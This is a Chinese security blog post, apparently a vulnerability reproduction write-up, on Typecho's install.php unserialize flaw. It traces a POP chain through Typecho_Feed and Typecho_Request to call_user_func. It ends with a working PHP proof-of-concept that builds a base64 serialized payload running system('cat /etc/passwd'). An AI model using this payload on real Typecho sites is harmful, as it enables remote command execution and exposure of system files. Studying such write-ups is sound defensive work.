@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>漏洞复现|Typecho反序列化漏洞getshell | Rinlang</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="0x01 漏洞前瞻漏洞条件：  Typecho version &lt; 15.5.12  复现环境：  apache2.4.41 PHP7.4.3 linux5.4.0-40  0x02 漏洞分析先找出install.php中的漏洞点，搜索unserialize()函数,230-235行 1234567&lt;?php    $config &#x3D; unserialize(base64_decode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞复现|Typecho反序列化漏洞getshell">
+<meta property="og:url" content="http://r4u.top/2020/08/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/index.html">
+<meta property="og:site_name" content="Rinlang">
+<meta property="og:description" content="0x01 漏洞前瞻漏洞条件：  Typecho version &lt; 15.5.12  复现环境：  apache2.4.41 PHP7.4.3 linux5.4.0-40  0x02 漏洞分析先找出install.php中的漏洞点，搜索unserialize()函数,230-235行 1234567&lt;?php    $config &#x3D; unserialize(base64_decode">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-08-01T17:29:30.000Z">
+<meta property="article:modified_time" content="2022-01-03T17:17:25.991Z">
+<meta property="article:author" content="Rinlang">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Rinlang" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Rinlang</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://r4u.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-漏洞复现-Typecho反序列化漏洞getshell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/08/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" class="article-date">
+  <time class="dt-published" datetime="2020-08-01T17:29:30.000Z" itemprop="datePublished">2020-08-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      漏洞复现|Typecho反序列化漏洞getshell
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-漏洞前瞻"><a href="#0x01-漏洞前瞻" class="headerlink" title="0x01 漏洞前瞻"></a>0x01 漏洞前瞻</h2><p>漏洞条件：</p>
+<ul>
+<li>Typecho version &lt; 15.5.12</li>
+</ul>
+<p>复现环境：</p>
+<ul>
+<li>apache2.4.41</li>
+<li>PHP7.4.3</li>
+<li>linux5.4.0-40</li>
+</ul>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>先找出<code>install.php</code>中的漏洞点，搜索<code>unserialize()</code>函数,230-235行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$config</span> = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">    Typecho_Cookie::delete(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> Typecho_Db(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">    <span class="variable">$db</span>-&gt;addServer(<span class="variable">$config</span>, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">    Typecho_Db::set(<span class="variable">$db</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参数被反序列化为数组之后先被赋给<code>$config</code>变量，然后再将其成员作为<code>Typecho_Db</code>类的参数，跟进这个类看一下，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">     <span class="keyword">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">     <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">     <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">     <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">     <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">     <span class="comment">//实例化适配器对象</span></span><br><span class="line">     <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$config[&#39;adapter&#39;]</code>这个成员首先会被当做字符串使用，然后会使用它来new一个新的对象</p>
+<p>所以这个过程中，虽然没有可以控制参数的危险函数，但是<code>$config[&#39;adapter&#39;]</code>中的类一定会被触发的魔术方法有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__toString()</span><br><span class="line">__construct()</span><br><span class="line">__destruct()</span><br></pre></td></tr></table></figure>
+
+<p>反序列化的参数来自于<code>Typecho_Cookie::get()</code>,看方法名猜测可控,跟进去查看一下,进入Typecho_Cookie类中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$_prefix</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="variable">$_prefix</span> . <span class="variable">$key</span>;</span><br><span class="line">       <span class="variable">$value</span> = <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$key</span>]) ? <span class="variable">$_COOKIE</span>[<span class="variable">$key</span>] : (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$_POST</span>[<span class="variable">$key</span>] : <span class="variable">$default</span>);</span><br><span class="line">       <span class="keyword">return</span> is_array(<span class="variable">$value</span>) ? <span class="variable">$default</span> : <span class="variable">$value</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出返回值来自<code>$_COOKIE[&#39;__typecho_config&#39;]</code>或<code>$_POST[&#39;__typecho_config&#39;]</code>，这都属于我们可控的内容</p>
+<p>然后返回来，查看如何才能使反序列化被执行:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;typecho&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) || !<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>]) &amp;&amp; <span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>] != <span class="number">80</span> &amp;&amp; !Typecho_Common::isAppEngine()) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;<span class="subst">&#123;$parts[&#x27;host&#x27;]&#125;</span>:<span class="subst">&#123;$parts[&#x27;port&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>需要给定一个<code>finish</code>参数,<code>Referer</code>给定本站url，并且在cookie中指定<code>__typecho_conig</code>，都很容易实现</p>
+<h2 id="0x02-POP链的寻找"><a href="#0x02-POP链的寻找" class="headerlink" title="0x02 POP链的寻找"></a>0x02 POP链的寻找</h2><p><code>__construct</code>一般来说是不利用的，因为一般来说无法控制参数，所以主要顺着思路在范围内查找包含<code>__toString()``__destruct()</code>方法的类，看是否有可以利用的POP链</p>
+<p>查找了一圈<code>__destruct</code>，并没有发现能够利用的链。</p>
+<p>最后在Feed.php中找到了一个也许能够利用的__toString方法    </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">self</span>::RSS2 == <span class="keyword">$this</span>-&gt;_type) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="string">&#x27;&lt;rss version=&quot;2.0&quot;</span></span><br><span class="line"><span class="string">xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;</span></span><br><span class="line"><span class="string">xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;</span></span><br><span class="line"><span class="string">xmlns:slash=&quot;http://purl.org/rss/1.0/modules/slash/&quot;</span></span><br><span class="line"><span class="string">xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;</span></span><br><span class="line"><span class="string">xmlns:wfw=&quot;http://wellformedweb.org/CommentAPI/&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;channel&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$lastUpdate</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">                <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">                <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">                <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">                <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">                <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="keyword">$this</span>-&gt;dateFormat(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">                <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">     ......</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$content .= &#39;&lt;dc:creator&gt;&#39; . htmlspecialchars($item[&#39;author&#39;]-&gt;screenName) . &#39;&lt;/dc:creator&gt;&#39; . self::EOL;</code>中调用了$item[‘author’]的screenName属性，而$item数组则是来自于属性$this-&gt;_items数组中的一个成员</p>
+<p>想着如果控制$item[‘author’]，也许能够触发<code>__get</code>方法，于是思路变为寻找可利用的<code>__get</code>方法</p>
+<p>在Typecho/Request.php中找到了一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进去</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[<span class="variable">$key</span>]):</span><br><span class="line">               <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;_params[<span class="variable">$key</span>];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>]):</span><br><span class="line">               <span class="variable">$value</span> = <span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$value</span> = !is_array(<span class="variable">$value</span>) &amp;&amp; strlen(<span class="variable">$value</span>) &gt; <span class="number">0</span> ? <span class="variable">$value</span> : <span class="variable">$default</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter(<span class="variable">$value</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可控的$this-&gt;_params[‘$key’]被赋给了$value，而$value被用作参数，跟进去看方法内有没有可以利用的点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = is_array(<span class="variable">$value</span>) ? array_map(<span class="variable">$filter</span>, <span class="variable">$value</span>) :</span><br><span class="line">            call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>危险函数<code>call_user_func</code>,参数<code>$value</code>可控，<code>$filter</code>可控</p>
+<p>梳理一下，大致的pop链</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> <span class="variable">$config</span></span><br><span class="line">↓</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span>-&gt;<span class="title">__toString</span>()</span></span><br><span class="line"><span class="class">↓</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Typecho_Request</span> -&gt; <span class="title">__get</span>() -&gt; <span class="title">get</span>() -&gt; <span class="title">_applyFilter</span>()</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-POC编写"><a href="#0x03-POC编写" class="headerlink" title="0x03 POC编写"></a>0x03 POC编写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&quot;cat /etc/passwd&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_filter[] = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">        <span class="keyword">const</span> RSS2 = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_type = <span class="built_in">self</span>::RSS2;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_items[] = <span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;link&quot;</span> =&gt; <span class="string">&quot;b&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;date&quot;</span> =&gt; <span class="string">&quot;c&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;author&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">                        <span class="string">&#x27;category&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request())</span><br><span class="line">                );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;a&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$exp</span>));</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://r4u.top/2020/08/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" data-id="ckxyy4hij00098xni6879968h" data-title="漏洞复现|Typecho反序列化漏洞getshell" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/10/12/%E8%B0%88%E8%B0%88%E5%BF%83%E5%BE%97-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%BC%95%E5%8F%8A%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          谈谈心得|计算机安全学习指引及资源汇总
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/05/22/Buuoj-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Buuoj|[网鼎杯2020 青龙组]notes</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97/" rel="tag">个人心得</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0/" rel="tag">思路复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
